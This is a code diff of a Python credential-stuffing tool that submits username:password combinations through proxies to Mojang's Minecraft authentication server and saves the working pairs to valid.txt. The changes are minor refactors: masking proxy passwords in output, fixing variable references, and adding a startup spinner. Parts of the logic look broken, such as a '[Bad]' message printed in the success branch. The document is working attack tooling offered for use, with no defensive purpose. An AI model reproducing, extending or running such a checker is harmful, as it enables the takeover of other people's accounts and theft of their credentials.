@@ -7,7 +7,7 @@ from requests import Session, exceptions
 from traceback import format_exc
 from easygui import fileopenbox
 
-import threading, requests, ctypes, time, os,sys, keyboard, random
+import threading, requests, ctypes, time, os, sys, keyboard, random
 
 class Misc:
     global mark, running, credits
@@ -164,14 +164,14 @@ class Main:
                     check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_table)
 
                     if "accessToken" in check.json():
-                        if hide_pwds == "true":
+                        if self.hide_pwds == "true":
                             print(f'{green}[Good] {white}{username}:{red}********')
                         elif print_bad == "true":
                             return None
                         else:
                             print(f'{red}[Bad] {white}{username}:{password}')
                     elif "error" in check.json():
-                        if hide_pwds == "true":
+                        if self.hide_pwds == "true":
                             print(f'{red}[Bad] {white}{username}:{red}********')
                         elif print_bad == "true":
                             return None
@@ -184,7 +184,7 @@ class Main:
                         self.proxy_list.remove(proxy)
                             
                     if "clientToken" in check.text:
-                        with open("valid.txt", "a") as f: f.write(f'{username}:{password}\n')
+                        with open("valid.txt", "a") as f: f.write(f'{username}:{password}')
                         self.valid += 1
                         self.title()
                     else:
@@ -193,9 +193,10 @@ class Main:
                 except Exception as err:
                     if "No connection could be made because the target machine actively refused it" in str(err):
                         self.proxy_list.remove(proxy)
+                        proxyhid = f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********'
                         # print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
                         if self.hide_pwds == "true":
-                            print(f'{red}[Invalid Proxy] {yellow}removing {white}=> ' + f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********')
+                            print(f'{red}[Invalid Proxy] {yellow}removing {white}=> {proxyhid}')
                         else:
                             print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
         except: pass
@@ -264,6 +265,21 @@ class Main:
             print(f'{green}[OK]{white}: You are running on the latest version.')
             time.sleep(3)
             os.system("cls")
+    
+    def as_print(self):
+        print(f'{yellow}[Auto Start]{white} Starting in a moment..', end="")
+        def spinning_cursor():
+            while True:
+                for cursor in '|/-\\':
+                    yield cursor
+
+        spinner = spinning_cursor()    
+        for _ in range(50):
+            sys.stdout.write(next(spinner))
+            sys.stdout.flush()
+            time.sleep(0.1)
+            sys.stdout.write('\b')
+        print()
 
     def main(self):
         init()
@@ -281,10 +297,11 @@ class Main:
                 print(mark)
                 self.retries = int(retries)
                 self.threads = int(threads)
-                if hide_passwords == "true":
+                if self.hide_pwds == "true":
                     self.hide = True
                 print(autostart_config + '\n')
-                time.sleep(3)
+                self.as_print()
+                time.sleep(2)
                 self.start()
 
             print(mark)
